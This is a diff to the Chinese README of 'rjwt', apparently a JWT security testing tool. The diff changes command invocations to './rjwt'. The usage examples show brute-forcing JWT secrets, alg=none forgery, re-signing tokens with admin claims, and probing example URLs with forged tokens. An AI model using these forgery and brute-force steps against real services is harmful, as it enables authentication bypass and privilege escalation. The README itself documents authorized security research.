@@ -38,16 +38,16 @@ cargo build --release
 ### 1. 解析JWT结构
 
 ```bash
-rjwt parse eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.xxxxx
+./rjwt parse eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.xxxxx
 
 # JSON输出（适合管道处理）
-rjwt parse <token> --json
+./rjwt parse <token> --json
 ```
 
 ### 2. 安全分析（漏洞检测 + 风险评级）
 
 ```bash
-rjwt analyze eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.
+./rjwt analyze eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.
 
 # 输出示例：
 # 综合风险等级: 🔴 严重 (CRITICAL)
@@ -59,52 +59,52 @@ rjwt analyze eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.
 
 ```bash
 # 使用内置字典（含400+弱密钥+动态扩展）
-rjwt brute <token>
+./rjwt brute <token>
 
 # 使用自定义字典文件
-rjwt brute <token> -w /path/to/wordlist.txt
+./rjwt brute <token> -w /path/to/wordlist.txt
 
 # 组合使用
-rjwt brute <token> -w wordlist.txt --builtin true
+./rjwt brute <token> -w wordlist.txt --builtin true
 ```
 
 ### 4. 伪造Token
 
 ```bash
 # alg=none 攻击（生成4种大小写变体）
-rjwt forge <token> --alg none
+./rjwt forge <token> --alg none
 
 # 用已知密钥重签（修改claims）
-rjwt forge <token> -s "secret" --payload '{"sub":"admin","role":"administrator"}'
+./rjwt forge <token> -s "secret" --payload '{"sub":"admin","role":"administrator"}'
 
 # 算法切换 HS256→HS512
-rjwt forge <token> -s "mykey" --alg HS512
+./rjwt forge <token> -s "mykey" --alg HS512
 ```
 
 ### 5. HTTP探测（与目标站点通信）
 
 ```bash
 # 默认 Authorization: Bearer 注入
-rjwt probe https://api.example.com/profile -t <token>
+./rjwt probe https://api.example.com/profile -t <token>
 
 # 自定义header注入
-rjwt probe https://api.example.com/data -t <token> --placement "header:X-Auth-Token"
+./rjwt probe https://api.example.com/data -t <token> --placement "header:X-Auth-Token"
 
 # Cookie注入
-rjwt probe https://api.example.com/ -t <token> --placement "cookie:session"
+./rjwt probe https://api.example.com/ -t <token> --placement "cookie:session"
 
 # Query参数注入
-rjwt probe https://api.example.com/api -t <token> --placement "query:jwt"
+./rjwt probe https://api.example.com/api -t <token> --placement "query:jwt"
 ```
 
 ### 6. 启动 Agent API 服务
 
 ```bash
 # 默认 127.0.0.1:7878
-rjwt serve
+./rjwt serve
 
 # 自定义地址（这个是Vibe Coding时顺便写的，我都没想到有什么用）
-rjwt serve --host 0.0.0.0 -p 9999
+./rjwt serve --host 0.0.0.0 -p 9999
 ```
 
 ---
@@ -254,4 +254,4 @@ rjwt/
 
 ## 声明
 
-开源协议为MIT License - 且仅用于合法授权的安全研究用途!!!
+开源协议为MIT License - 且仅用于合法授权的安全研究用途.
